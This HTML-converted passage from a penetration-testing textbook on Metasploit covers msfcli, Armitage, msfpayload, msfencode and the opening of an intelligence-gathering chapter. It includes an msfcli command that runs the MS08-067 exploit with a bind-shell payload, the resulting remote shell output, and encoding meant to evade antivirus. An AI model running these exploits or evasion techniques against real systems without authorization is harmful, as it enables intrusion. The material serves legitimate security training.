with a host. The resulting documentation lists usage, a description of the tool, and the various option flags.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_011.png"/></span></p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">msf &gt; <span class="s24">help connect</span></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_012.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 108pt;text-indent: 0pt;text-align: left;">We’ll explore MSFConsole in greater depth in the chapters that follow.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s21" style="padding-left: 90pt;text-indent: 0pt;text-align: left;"><a name="bookmark63">MSFcli</a><a name="bookmark81">&zwnj;</a></p><p class="s19" style="padding-top: 4pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Msfcli <span class="p">and </span>msfconsole <span class="p">take very different approaches to providing access to the Framework. Where </span>msfconsole <span class="p">provides an interactive way to access all features in a user-friendly manner, </span>msfcli <span class="p">puts the priority on scripting and interpret- ability with other console-based tools. Instead of providing a unique inter- preter to the Framework, </span>msfcli <span class="p">runs directly from the command line, which allows you to redirect output from other tools into </span>msfcli <span class="p">and direct </span>msfcli <span class="p">output to other command-line tools. </span>Msfcli <span class="p">also supports the launching of exploits and auxiliary modules, and it can be convenient when testing mod- ules or developing new exploits for the Framework. It is a fantastic tool for</span></p><p style="padding-top: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">unique exploitation when you know exactly which exploit and options you need. It is less forgiving than <span class="s19">msfconsole</span>, but it offers some basic help (includ- ing usage and a list of modes) with the command <span class="s25">msfcli -h</span>, as shown here:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_013.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">root@bt:/opt/framework3/msf3# msfcli -h</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Usage: /opt/framework3/msf3/msfcli &lt;exploit_name&gt; &lt;option=value&gt; [mode]</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">==============================================================================</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 103pt;text-indent: 0pt;text-align: left;">Mode Description</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s27" style="padding-left: 103pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="23" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_014.png"/></span>	<span><img width="86" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_015.png"/></span></p><p class="s25" style="padding-top: 3pt;padding-left: 103pt;text-indent: 0pt;text-align: left;">(H)elp You&#39;re looking at it, baby! (S)ummary Show information about this module</p><p class="s25" style="padding-left: 103pt;text-indent: 0pt;text-align: left;">(O)ptions Show available options for this module (A)dvanced Show available advanced options for this module</p><p class="s25" style="padding-left: 103pt;text-indent: 0pt;text-align: left;">(I)DS Evasion Show available ids evasion options for this module (P)ayloads Show available payloads for this module</p><p class="s25" style="padding-left: 103pt;text-indent: 0pt;text-align: left;">(T)argets Show available targets for this exploit module (AC)tions Show available actions for this auxiliary module (C)heck Run the check routine of the selected module (E)xecute Execute the selected module</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-top: 3pt;padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">root@bt:/opt/framework3/msf3#</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_016.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s23" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">Sample Usage</p><p style="padding-top: 4pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Let’s take a look at how you might use <span class="s19">msfcli</span>. Don’t worry about the details; these examples are intended to give you a sense of how you might work with this interface.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">When you are first learning Metasploit or whenever you get stuck, you can see the options available in a module by appending the letter <span class="s25">O </span>to the end of the string at whichever point you are stuck. For example, in the following listing, we use the <span class="s25">O </span>to see the options available for the <span class="s19">ms08_067_netapi </span>module:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_017.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">root@bt:/# <span class="s24">msfcli windows/smb/ms08_067_netapi O</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] Please wait while we load the module tree...</p><p style="text-indent: 0pt;text-align: left;"><br/></p><table style="border-collapse:collapse;margin-left:90.5pt" cellspacing="0"><tr style="height:16pt"><td style="width:13pt" rowspan="2"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:38pt;border-bottom-style:dashed;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Name</p></td><td style="width:64pt;border-bottom-style:dashed;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Current Setting</p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:34pt;border-bottom-style:dashed;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Required</p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:168pt;border-bottom-style:dashed;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Description</p></td></tr><tr style="height:15pt"><td style="width:38pt;border-top-style:dashed;border-top-width:1pt"><p class="s28" style="padding-top: 3pt;text-indent: 0pt;line-height: 10pt;text-align: left;">RHOST</p></td><td style="width:64pt;border-top-style:dashed;border-top-width:1pt"><p class="s28" style="padding-top: 3pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0.0.0.0</p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:34pt;border-top-style:dashed;border-top-width:1pt"><p class="s28" style="padding-top: 3pt;text-indent: 0pt;line-height: 10pt;text-align: left;">yes</p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:168pt;border-top-style:dashed;border-top-width:1pt"><p class="s28" style="padding-top: 3pt;text-indent: 0pt;line-height: 10pt;text-align: left;">The target address</p></td></tr><tr style="height:24pt"><td style="width:13pt;border-bottom-style:solid;border-bottom-width:1pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:38pt;border-bottom-style:solid;border-bottom-width:1pt"><p class="s28" style="padding-right: 7pt;text-indent: 0pt;text-align: left;">RPORT SMBPIPE</p></td><td style="width:64pt;border-bottom-style:solid;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">445</p><p class="s28" style="text-indent: 0pt;line-height: 11pt;text-align: left;">BROWSER</p></td><td style="width:8pt;border-bottom-style:solid;border-bottom-width:1pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:34pt;border-bottom-style:solid;border-bottom-width:1pt"><p class="s28" style="padding-right: 20pt;text-indent: 0pt;text-align: left;">yes yes</p></td><td style="width:8pt;border-bottom-style:solid;border-bottom-width:1pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:168pt;border-bottom-style:solid;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Set the SMB service port</p><p class="s28" style="text-indent: 0pt;line-height: 11pt;text-align: left;">The pipe name to use (BROWSER, SRVSVC)</p></td></tr></table><p style="padding-top: 7pt;padding-left: 83pt;text-indent: 0pt;text-align: center;">You can see that the module requires three options: <span class="s25">RHOST</span>, <span class="s25">RPORT</span>, and</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">SMPIPE<span class="p">. Now, by adding a </span>P<span class="p">, we can check for available payloads:</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_018.png"/></span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">root@bt:/# <span class="s24">msfcli windows/smb/ms08_067_netapi RHOST=192.168.1.155 P</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] Please wait while we load the module tree...</p><p class="s25" style="padding-top: 3pt;padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Compatible payloads</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">===================</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 49pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Name Description</p><p class="s25" style="padding-left: 49pt;text-indent: 0pt;line-height: 11pt;text-align: left;">---- -----------</p><p class="s25" style="padding-bottom: 4pt;padding-left: 49pt;text-indent: 0pt;text-align: left;">generic/debug_trap Generate a debug trap in the target process generic/shell_bind_tcp Listen for a connection and spawn a command shell</p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_019.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;text-align: justify;">Having set all the required options for our exploit and selecting a pay- load, we can run our exploit by passing the letter <span class="s25">E </span>to the end of the <span class="s19">msfcli </span>argument string, as shown here:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_020.png"/></span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">root@bt:/# <span class="s24">msfcli  windows/smb/ms08_067_netapi  RHOST=192.168.1.155  PAYLOAD=windows/shell/bind_tcp  E</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">[*] Please wait while we load the module tree... [*] Started bind handler</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 10pt;text-align: left;">[*] Automatically detecting the target...</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">[*] Fingerprint: Windows XP Service Pack 2 - lang:English [*] Selected Target: Windows XP SP2 English (NX)</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">[*] Triggering the vulnerability... [*] Sending stage (240 bytes)</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] Command shell session 1 opened (192.168.1.101:46025 -&gt; 192.168.1.155:4444)</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Microsoft Windows XP [Version 5.1.2600]</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">(C) Copyright 1985-2001 Microsoft Corp.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-top: 3pt;padding-bottom: 4pt;padding-left: 36pt;text-indent: 0pt;text-align: left;">C:\WINDOWS\system32&gt;</p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_021.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">We’re successful, because we have received a Windows command prompt from the remote system.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s21" style="padding-left: 90pt;text-indent: 0pt;text-align: left;"><a name="bookmark64">Armitage</a><a name="bookmark82">&zwnj;</a></p><p style="padding-top: 4pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">The <span class="s19">armitage </span>component of Metasploit is a fully interactive graphical user interface created by Raphael Mudge. This interface is highly impressive, feature rich, and available for free. We won’t be covering <span class="s19">armitage </span>in depth, but it is definitely worth mentioning as something to explore. Our goal is to teach the ins and outs of Metasploit, and the GUI is awesome once you understand how the Framework actually operates.</p><p class="s23" style="padding-top: 9pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Running Armitage</p><p style="padding-top: 4pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">To launch <span class="s19">armitage</span>, run the command <span class="s25">armitage</span>. During startup, select <span class="s18">Start MSF</span>, which will allow <span class="s19">armitage </span>to connect to your Metasploit instance.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_022.png"/></span></p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">root@bt:/opt/framework3/msf3# <span class="s24">armitage</span></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_023.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">After <span class="s19">armitage </span>is running, simply click a menu to perform a particular attack or access other Metasploit functionality. For example, Figure 2-1 shows the browser (client-side) exploits.</p><p style="padding-left: 91pt;text-indent: 0pt;text-align: left;"><span><img width="429" height="424" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_024.gif"/></span></p><p class="s29" style="padding-top: 5pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Figure 2-1: The <span class="s30">armitage</span>’s browser exploit menu</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s4" style="padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark65">Metasploit Utilities</a><a name="bookmark83">&zwnj;</a></p><p style="padding-top: 8pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Having covered Metasploit’s three main interfaces, it’s time to cover a few utilities. Metasploit’s utilities are direct interfaces to particular features of the Framework that can be useful in specific situations, especially in exploit devel- opment. We will cover some of the more approachable utilities here and introduce additional ones throughout the book.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s21" style="padding-left: 90pt;text-indent: 0pt;text-align: left;"><a name="bookmark66">MSFpayload</a><a name="bookmark84">&zwnj;</a></p><p style="padding-top: 4pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">The <span class="s19">msfpayload </span>component of Metasploit allows you to generate shellcode, executables, and much more for use in exploits outside of the Framework.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">Shellcode can be generated in many formats including C, Ruby, JavaScript, and even Visual Basic for Applications. Each output format will be useful in various situations. For example, if you are working with a Python-based proof of concept, C-style output might be best; if you are working on a browser exploit, a JavaScript output format might be best. After you have your desired output, you can easily insert the payload directly into an HTML file to trigger the exploit.</p><p style="padding-top: 3pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">To see which options the utility takes, enter <span class="s24">msfpayload -h </span>at the command line, as shown here:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_025.png"/></span></p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">root@bt:/# <span class="s24">msfpayload -h</span></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_026.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">As with <span class="s19">msfcli</span>, if you find yourself stuck on the required options for a pay- load module, append the letter <span class="s25">O </span>on the command line for a list of required and optional variables, like so:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_027.png"/></span></p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">root@bt:/# <span class="s24">msfpayload windows/shell_reverse_tcp O</span></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_028.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">We will dive much deeper into <span class="s19">msfpayload </span>as we explore exploit develop- ment in later chapters.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s21" style="padding-left: 90pt;text-indent: 0pt;text-align: left;"><a name="bookmark67">MSFencode</a><a name="bookmark85">&zwnj;</a></p><p style="padding-top: 4pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">The shellcode generated by <span class="s19">msfpayload </span>is fully functional, but it contains sev- eral null characters that, when interpreted by many programs, signify the end of a string, and this will cause the code to terminate before completion. In other words, those <span class="s25">x00</span>s and <span class="s25">xff</span>s can break your payload!</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">In addition, shellcode traversing a network in cleartext is likely to be picked up by intrusion detection systems (IDSs) and antivirus software. To address this problem, Metasploit’s developers offer <span class="s19">msfencode</span>, which helps you to avoid bad characters and evade antivirus and IDSs by encoding the original payload in a way that does not include “bad” characters. Enter <span class="s24">msfencode  -h </span>to see a list of <span class="s19">msfencode </span>options.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">Metasploit contains a number of different encoders for specific situations. Some will be useful when you can use only alphanumeric characters as part of a payload, as is the case with many file format exploits or other applications that accept only printable characters as input, while others are great general purpose encoders that do well in every situation.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">When in doubt, though, you really can’t go wrong with the <span class="s19">x86/shikata_ ga_nai </span>encoder, the only encoder with the rank of Excellent, a measure of the reliability and stability of a module. In the context of an encoder, an Excellent ranking implies that it is one of the most versatile encoders and can accommodate a greater degree of fine-tuning than other encoders. To see the list of encoders available, append <span class="s25">-l </span>to <span class="s25">msfencode </span>as shown next. The payloads are ranked in order of reliability.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_029.png"/></span></p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">root@bt:~# <span class="s24">msfencode -l</span></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_030.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s21" style="padding-left: 90pt;text-indent: 0pt;text-align: left;"><a name="bookmark68">Nasm Shell</a><a name="bookmark86">&zwnj;</a></p><p style="padding-top: 4pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">The <span class="s19">nasm_shell.rb </span>utility can be handy when you’re trying to make sense of assembly code, especially if, during exploit development, you need to iden- tify the <span class="s19">opcodes </span>(the assembly instructions) for a given assembly command.</p><p style="padding-top: 3pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">For example, here we run the tool and request the opcodes for the <span class="s25">jmp esp </span>command, which <span class="s25">nasm_shell </span>tells us is FFE4.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_031.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">root@bt:/opt/framework3/msf3/tools# <span class="s24">./nasm_shell.rb</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">nasm &gt; <span class="s24">jmp  esp</span></p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">00000000 FFE4 jmp esp</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_032.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s4" style="padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark69">Metasploit Express and Metasploit Pro</a><a name="bookmark87">&zwnj;</a></p><p style="padding-top: 8pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Metasploit Express and Metasploit Pro are commercial web interfaces to the Metasploit Framework. These utilities provide substantial automation and make things easier for new users, while still providing full access to the Framework. Both products also provide tools that are unavailable in the community editions of the Framework, such as automated password brute forcing and automated website attacks. In addition, a nice reporting back- end to Metasploit Pro can speed up one of the least popular aspects of penetration testing: writing the report.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">Are these tools worth purchasing? Only you can make that choice. The commercial editions of Metasploit are intended for professional penetration testers and can ease many of the more routine aspects of the job, but if the time savings from the automations in these commercial products are useful for you, they might justify the purchase price.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">Remember, however, as you automate your work, that humans are better at identifying attack vectors than automated tools.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s4" style="padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark70">Wrapping Up</a></p><p style="padding-top: 8pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">In this chapter, you learned a little bit of the basics of the Metasploit Frame- work. As you progress through this book, you will begin using these tools in a much more advanced capacity. You’ll find a few different ways to accomplish the same tasks using different tools. It will ultimately be up to you to decide which tool best suits your needs.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">Now that you have the basics under control, let’s move to the next phase of the pen testing process: discovery.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 231pt;text-indent: 0pt;text-align: left;"><span><img width="68" height="125" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_033.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s11" style="padding-top: 7pt;padding-left: 119pt;text-indent: 0pt;text-align: left;"><a name="bookmark88">INTELLIGENCE GATHERING </a><a name="bookmark105">&zwnj;</a><a name="bookmark106">&zwnj;</a></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s17" style="padding-top: 15pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Intelligence gathering follows the pre-engagement activities as the second step in a penetration test. Your goals during intelligence gathering should be to gain accurate information about your targets without reveal- ing your presence or your intentions, to learn how the organization operates, and to determine the best route</p><p style="padding-top: 1pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">of entry. If you don’t do a thorough job of intelligence gathering, you may miss vulnerable systems or viable attack vectors. It takes time and patience to sort through web pages, perform Google hacking, and map systems thor- oughly in an attempt to understand the infrastructure of a particular target. Intelligence gathering requires careful planning, research, and, most impor- tantly, the ability to think like an attacker. At this step, you will attempt to col- lect as much information about the target environment as possible. This can be an expansive amount of information, and even the most trivial data gath- ered during this stage can prove useful later on, so pay attention.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">Before you begin intelligence gathering, consider how you will record everything you do and the results you achieve. You must remember and record</p><p style="padding-top: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">as many details of your penetration test as possible. Most security professionals quickly learn that detailed notes can mean the difference between a successful and a failed penetration test. Just as a scientist needs to achieve reproducible results, other experienced penetration testers should be able to reproduce your work using your documentation alone.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">Intelligence gathering is arguably the most important aspect of a pene- tration test, because it provides the foundation for all work that follows. When recording your work, be methodical, accurate, and precise. And, as stated earlier, be sure that before you fire off your exploits, you have learned all that you can about your target.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">The excitement for most people comes in exploiting systems and getting to root, but you need to learn to walk before you can run.</p><p class="s22" style="padding-top: 9pt;padding-left: 90pt;text-indent: -56pt;text-align: left;">WARNING <span class="s19">If you follow the procedures in this chapter, you can actually damage your system and your target’s system, so be sure to set up your test environment now. (For help, see Appendix A.) Many of the examples in these chapters can be destructive and make a target system unusable. The activities discussed in this chapter could be considered illegal if they are undertaken by someone with bad intentions, so follow the rules and don’t be stupid.</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s4" style="padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark89">Passive Information Gathering</a><a name="bookmark107">&zwnj;</a></p><p style="padding-top: 10pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">By using <span class="s19">passive </span>and <span class="s19">indirect </span>information gathering, you can discover informa- tion about targets without touching their systems. For example, you can use these techniques to identify network boundaries, identify the network main- tainers, and even learn what operating system and web server software is in use on the target network.</p><p class="s19" style="padding-left: 90pt;text-indent: 18pt;text-align: left;">Open source intelligence (OSINT) <span class="p">is a form of intelligence collection that uses open or readily available information to find, select, and acquire infor- mation about a target. Several tools make passive information gathering almost painless, including complex tools such as Yeti and the humble </span>whois<span class="p">. In this section, we’ll explore the process of passive information gathering and the tools that you might use for this step.</span></p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;"><a href="http://www.secmaniac.net/" class="s31" target="_blank">Imagine, for example, an attack against </a><a href="http://www.secmaniac.net/" class="s20" target="_blank">http://www.secmaniac.net/</a>. Our goal is to determine, as a part of a penetration test, what systems the com- pany owns and what systems we can attack. Some systems may not be owned by the company and could be considered out of scope and unavailable for attack.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s21" style="padding-left: 90pt;text-indent: 0pt;text-align: left;"><a name="bookmark90">whois Lookups</a><a name="bookmark108">&zwnj;</a></p><p style="padding-top: 4pt;padding-left: 90pt;text-indent: 0pt;line-height: 12pt;text-align: left;">Let’s begin by using Back|Track’s <span class="s19">whois </span>lookup to find the names of</p><p class="s19" style="padding-left: 90pt;text-indent: 0pt;line-height: 12pt;text-align: left;">secmaniac.net<span class="p">’s domain servers.</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_034.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf &gt; <span class="s24">whois secmaniac.net</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] exec: whois secmaniac.net</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s24" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">. . . SNIP . . .</p><p class="s25" style="padding-top: 3pt;padding-left: 103pt;text-indent: -12pt;text-align: left;">Registered through: GoDaddy.com, Inc. (http://www.godaddy.com) Domain Name: SECMANIAC.NET</p><p class="s25" style="padding-left: 115pt;text-indent: 0pt;text-align: left;">Created on: 03-Feb-10 Expires on: 03-Feb-12</p><p class="s25" style="padding-left: 115pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Last Updated on: 03-Feb-10</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s30" style="padding-bottom: 3pt;padding-left: 115pt;text-indent: -17pt;line-height: 88%;text-align: left;">O<span class="s25">Domain servers in listed order: NS57.DOMAINCONTROL.COM NS58.DOMAINCONTROL.COM</span></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_035.png"/></span></p><p style="padding-top: 6pt;padding-left: 90pt;text-indent: 18pt;line-height: 89%;text-align: left;">We learn at <span class="s32">O </span>that the Domain Name System (DNS) servers are hosted by <span class="s19">DOMAINCONTROL.COM</span>, so this is a good example of systems that would not be included in a penetration test because we would have no authority to</p><p style="padding-left: 90pt;text-indent: 0pt;text-align: left;">attack them. In most large organizations, the DNS servers are housed within the company and are viable attack vectors. Zone transfers and similar DNS attacks can often be used to learn more about a network from both the inside and outside. In this scenario, because <span class="s19">DOMAINCONTROL.COM </span>is not owned by <span class="s19">secmaniac.net</span>, we should not attack these systems and will instead move on to a different attack vector.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s21" style="padding-left: 90pt;text-indent: 0pt;text-align: left;"><a name="bookmark91">Netcraft</a><a name="bookmark109">&zwnj;</a></p><p style="padding-top: 4pt;padding-left: 90pt;text-indent: 0pt;text-align: left;"><a href="http://searchdns.netcraft.com/)" class="s31" target="_blank">Netcraft (</a><a href="http://searchdns.netcraft.com/)" class="s20" target="_blank">http://searchdns.netcraft.com/</a>) is a web-based tool that we can use to find the IP address of a server hosting a particular website, as shown in Figure 3-1.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 